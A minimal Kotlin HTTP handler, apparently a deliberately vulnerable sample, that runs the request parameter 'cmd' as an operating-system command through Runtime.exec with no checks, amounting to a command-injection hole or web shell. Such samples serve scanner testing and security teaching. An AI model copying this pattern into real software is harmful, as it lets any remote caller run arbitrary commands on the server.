class Main {
    fun handle(req: HttpServletRequest) {
        val cmd = req.getParameter("cmd")
        Runtime.getRuntime().exec(cmd)
    }
}
